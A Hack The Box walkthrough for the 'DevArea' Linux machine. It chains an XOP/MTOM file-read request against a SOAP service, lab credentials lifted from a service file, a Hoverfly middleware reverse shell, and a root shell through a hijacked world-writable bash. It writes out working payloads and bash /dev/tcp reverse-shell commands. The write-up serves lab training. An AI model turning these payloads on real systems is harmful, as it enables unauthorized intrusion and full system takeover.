# 🚀 DevArea - Hack The Box Walkthrough

SEO terms: HackTheBox DevArea writeup, DevArea HTB walkthrough, devarea.htb solution, Hoverfly middleware RCE, XOP MTOM file read, SOAP file inclusion, Jetty Apache CXF exploit, Linux privilege escalation writable bash.

![Platform](https://img.shields.io/badge/Platform-HackTheBox-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-green)
![Status](https://img.shields.io/badge/Status-Rooted-success)

> Search keywords: DevArea, devarea.htb, HackTheBox, HTB, Hoverfly, Apache CXF, XOP, MTOM, SOAP, file read, JWT, middleware, reverse shell, sudo, syswatch, writable bash, privilege escalation, Linux writeup.

## 📌 Overview

| Field | Value |
|---|---|
| Machine | DevArea |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Medium |
| Target IP | `<Target_IP>` |
| Your IP | `<Your_IP>` |
| Techniques | XOP/MTOM file read, credential extraction, API abuse, reverse shell, writable binary privesc |

---

## 📚 Table of Contents

1. [Enumeration](#-enumeration)
2. [Initial Access](#-initial-access)
3. [User Access](#-user-access)
4. [Privilege Escalation](#-privilege-escalation)
5. [Flags](#-flags)
6. [Attack Chain Summary](#-attack-chain-summary)

---

## 🔎 Enumeration

Initial scan:

```bash
nmap -sC -sV -p- <Target_IP>
```

Observed services:

```text
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server (Hoverfly Dashboard)
```

Interesting targets:
- `8080/tcp` exposed a SOAP service
- `8888/tcp` exposed the Hoverfly API/dashboard
- `21/tcp` allowed anonymous FTP, but it did not provide useful access

---

## 🎯 Initial Access

### 1. Discover the SOAP endpoint

The SOAP service was reachable at:

```bash
curl -s http://<Target_IP>:8080/employeeservice?wsdl
```

### 2. Abuse XOP/MTOM for local file read

The application accepted multipart MTOM requests and processed `xop:Include`. By supplying a `file://` URI in the `href` field, local files could be read from the target.

```bash
curl -s -X POST http://<Target_IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\n\
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n\
Content-Transfer-Encoding: 8bit\r\n\
Content-ID: <root@example.com>\r\n\r\n\
<?xml version="1.0"?>\
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\
<soap:Body><tns:submitReport><arg0><confidential>false</confidential>\
<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></content>\
<department>x</department><employeeName>x</employeeName>\
</arg0></tns:submitReport></soap:Body></soap:Envelope>\r\n--MIMEBoundary--'
```

The SOAP response returned base64-encoded content. Decoding it revealed credentials inside the Hoverfly service configuration:

```ini
[Service]
User=dev_ryan
Group=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU
```

Recovered credentials:
- Username: `admin`
- Password: `O7IJ27MyyXiU`

### 3. Authenticate to Hoverfly

```bash
TOKEN=$(curl -s -X POST http://<Target_IP>:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' | jq -r .token)

echo "$TOKEN"
```

### 4. Trigger a reverse shell

Start a listener:

```bash
nc -lvnp 4444
```

Then configure Hoverfly middleware to execute a reverse shell:

```bash
curl -s -X PUT http://<Target_IP>:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/<Your_IP>/4444 0>&1 &"}'
```

Successful shell:

```text
dev_ryan@devarea:/opt/HoverFly$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)

dev_ryan@devarea:/opt/HoverFly$ whoami
dev_ryan

dev_ryan@devarea:/opt/HoverFly$ hostname
devarea
```

---

## 👤 User Access

After landing as `dev_ryan`, enumerate the home directory:

```bash
cd ~
pwd
ls -la
```

Useful findings included:
- `syswatch-v1.zip`
- `.ssh/`
- `user.txt`

Read the user flag:

```bash
cat /home/dev_ryan/user.txt
```

**user.txt**
```text
b89d674708dc3048████████████████
```

---

## ⬆️ Privilege Escalation

### 5. Check sudo rights

```bash
sudo -l
```

Output:

```text
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

### 6. Check `/usr/bin/bash` permissions

```bash
ls -la /usr/bin/bash
```

Output:

```text
-rwxrwxrwx 1 root root 1446024 Mar 28 23:30 /usr/bin/bash
```

This is the critical misconfiguration: `/usr/bin/bash` is world-writable.

### 7. Create a wrapper and hijack bash

Backup the original binary:

```bash
cp /bin/bash /tmp/bash.bak
```

Create a wrapper that spawns a root shell back to the attacker, restores the original binary, and then executes the original bash:

```bash
cat >/tmp/evil_bash <<'EOF'
#!/tmp/bash.bak
bash -i >& /dev/tcp/<Your_IP>/4445 0>&1 &
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"
EOF
```

Make it executable:

```bash
chmod +x /tmp/evil_bash
```

Start a second listener:

```bash
nc -lvnp 4445
```

Replace `/usr/bin/bash` and trigger the sudo-allowed script:

```bash
/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &
```

This results in a root reverse shell.

Successful shell:

```text
root@devarea:/home/dev_ryan# id
uid=0(root) gid=0(root) groups=0(root)

root@devarea:/home/dev_ryan# whoami
root

root@devarea:/home/dev_ryan# hostname
devarea
```

Read the root flag:

```bash
cat /root/root.txt
```

**root.txt**
```text
8b726ff797c8e3ef████████████████
```

---

## 🏁 Flags

| Flag | Value |
|---|---|
| user.txt | `b89d674708dc3048████████████████` |
| root.txt | `8b726ff797c8e3ef████████████████` |

---

## 🧠 Attack Chain Summary

```text
Nmap enumeration
→ SOAP endpoint discovery
→ XOP/MTOM file read
→ hoverfly.service credential extraction
→ Hoverfly API authentication
→ middleware reverse shell as dev_ryan
→ sudo rights discovery
→ writable /usr/bin/bash abuse
→ syswatch-triggered bash hijack
→ root shell
```

---

## 🔍 Search Terms

HackTheBox DevArea writeup, DevArea HTB walkthrough, devarea.htb solution, Apache CXF SOAP exploit, XOP Include file read, MTOM exploitation, Hoverfly middleware reverse shell, Hoverfly JWT auth, Linux privesc writable bash, syswatch.sh sudo privilege escalation, Jetty 9.4.27 exploit path, HackTheBox Linux medium machine.

> For authorized lab and CTF use only.
